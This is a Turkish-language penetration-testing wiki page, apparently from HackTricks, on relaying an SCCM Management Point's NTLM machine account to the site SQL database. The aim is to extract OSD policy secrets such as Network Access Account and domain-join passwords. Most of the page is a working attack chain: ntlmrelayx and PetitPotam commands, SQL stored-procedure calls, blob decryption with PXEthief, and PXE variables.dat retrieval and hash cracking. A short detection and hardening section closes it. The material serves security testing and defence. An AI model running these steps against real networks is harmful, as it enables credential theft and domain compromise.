# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Bir **System Center Configuration Manager (SCCM) Management Point (MP)**'in SMB/RPC üzerinden kimlik doğrulaması yapmasını sağlayıp bu NTLM machine account'u **site database (MSSQL)**'e **relaying** ederek `smsdbrole_MP` / `smsdbrole_MPUserSvc` haklarını elde edersiniz.  Bu roller, **Operating System Deployment (OSD)** policy blob'larını (Network Access Account credentials, Task-Sequence variables vb.) açığa çıkaran bir dizi stored procedure'ü çağırmanıza olanak tanır.  Blob'lar hex-encoded/encrypted durumdadır; ancak **PXEthief** ile decode ve decrypt edilerek plaintext secret'lar elde edilebilir.

High-level chain:
1. MP & site DB'yi keşfedin ↦ kimlik doğrulaması gerektirmeyen HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` başlatın.
3. **PetitPotam**, PrinterBug, DFSCoerce vb. kullanarak MP'yi coerce edin.
4. SOCKS proxy üzerinden `mssqlclient.py -windows-auth` ile relayed **<DOMAIN>\\<MP-host>$** account olarak bağlanın.
5. Çalıştırın:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (veya `MP_GetPolicyBodyAfterAuthorization`)
6. `0xFFFE` BOM'unu kaldırın, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

`OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` vb. secret'lar PXE'ye veya client'lara dokunmadan elde edilir.<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Enumerating unauthenticated MP endpoints
MP ISAPI extension'ı **GetAuth.dll**, kimlik doğrulaması gerektirmeyen (site yalnızca PKI kullanmıyorsa) çeşitli parametreleri açığa çıkarır:<sup>[[1]](#references)</sup>

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Site signing cert public key'i ve *x86* / *x64* **All Unknown Computers** device'larının GUID'lerini döndürür. |
| `MPLIST` | Site içindeki tüm Management-Point'leri listeler. |
| `SITESIGNCERT` | Primary-Site signing certificate'ını döndürür (LDAP olmadan site server'ını belirleyin). |

Daha sonraki DB sorgularında **clientID** olarak kullanılacak GUID'leri alın:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. MP makine hesabını MSSQL'e Relay Et
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Coercion tetiklendiğinde şuna benzer bir çıktı görmelisiniz:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Stored procedures ile OSD policy'lerini belirleme
SOCKS proxy üzerinden bağlanın (varsayılan olarak 1080 portu):<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
**CM_<SiteCode>** DB'ye geçin (3 haneli site kodunu kullanın, örn. `CM_001`).

### 3.1  Bilinmeyen Bilgisayar GUID'lerini Bulma (isteğe bağlı)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Atanmış policy'leri listeleme
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Her satır `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion` içerir.

Şu politikalara odaklanın:
* **NAAConfig** – Network Access Account kimlik bilgileri
* **TS_Sequence** – Task Sequence değişkenleri (OSDJoinAccount/Password)
* **CollectionSettings** – run-as hesapları içerebilir

### 3.3 Tam gövdeyi alma
Zaten `PolicyID` ve `PolicyVersion` değerlerine sahipseniz, aşağıdakini kullanarak clientID gereksinimini atlayabilirsiniz:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> ÖNEMLİ: SSMS'de “Maximum Characters Retrieved” değerini (>65535) artırın; aksi takdirde blob kesilecektir.

---

## 4. Blob'u decode edin ve decrypt edin
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Kurtarılan secrets örneği:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. İlgili SQL roller ve prosedürler
relay sonrasında login şu rollere eşlenir:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Bu roller onlarca EXEC izni sunar; bu attack'te kullanılan başlıca izinler şunlardır:

| Stored Procedure | Amaç |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Bir `clientID` için uygulanan policy'leri listeler. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Tam policy gövdesini döndürür. |
| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` path'i tarafından döndürülür. |

Tam listeyi şu şekilde inceleyebilirsiniz:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE boot media toplama (SharpPXE)
* **UDP/4011 üzerinden PXE yanıtı**: PXE için yapılandırılmış bir Distribution Point'a PXE boot isteği gönderin. proxyDHCP yanıtı, `SMSBoot\\x64\\pxe\\variables.dat` (şifrelenmiş yapılandırma) ve `SMSBoot\\x64\\pxe\\boot.bcd` gibi boot yollarını ve isteğe bağlı bir şifrelenmiş key blob'u açığa çıkarır.<sup>[[4]](#references)</sup>
* **Boot artifact'larını TFTP üzerinden alın**: Dönen yolları kullanarak `variables.dat` dosyasını TFTP üzerinden indirin (kimlik doğrulama gerekmez). Dosya küçüktür (birkaç KB) ve şifrelenmiş media variables bilgilerini içerir.
* **Decrypt veya crack işlemi**:
- Yanıt decryption key içeriyorsa, `variables.dat` dosyasını doğrudan decrypt etmek için **SharpPXE**'ye verin.
- Key sağlanmamışsa (PXE media custom password ile korunuyorsa), SharpPXE offline cracking için **Hashcat-compatible** `$sccm$aes128$...` hash'i üretir. Password'u geri aldıktan sonra dosyanın şifresini çözün.
* **Decrypt edilmiş XML'i parse edin**: Plaintext variables, SCCM deployment metadata'sını (**Management Point URL**, **Site Code**, media GUID'leri ve diğer identifier'lar) içerir. SharpPXE bunları parse eder ve sonraki abuse işlemleri için GUID/PFX/site parametreleri önceden doldurulmuş, çalıştırılmaya hazır bir **SharpSCCM** command yazdırır.
* **Gereksinimler**: Yalnızca PXE listener'a (UDP/4011) ve TFTP'ye network erişimi gerekir; local admin privileges gerekmez.

---

## 7. Detection & Hardening
1. **MP login'lerini monitor edin** – bir MP computer account'un kendi host'u olmayan bir IP'den login olması ≈ relay.<sup>[[1]](#references)</sup>
2. Site database üzerinde **Extended Protection for Authentication (EPA)** özelliğini etkinleştirin (`PREVENT-14`).
3. Kullanılmayan NTLM'i disable edin, SMB signing'i zorunlu tutun, RPC'yi kısıtlayın (
`PetitPotam`/`PrinterBug`'a karşı kullanılan mitigation'ların aynısı).
4. MP ↔ DB iletişimini IPSec / mutual-TLS ile harden edin.
5. **PXE exposure'ını kısıtlayın** – UDP/4011 ve TFTP'yi trusted VLAN'larla sınırlandırın, PXE password'ları zorunlu tutun ve `SMSBoot\\*\\pxe\\variables.dat` dosyasının TFTP üzerinden indirilmesi için alert oluşturun.<sup>[[4]](#references)</sup>

---

## Ayrıca bkz.
* NTLM relay temelleri:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## References
- [1] [Manager'ınızla Görüşmek İstiyorum: Management Point Relay'leriyle Secret'ları Çalmak](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
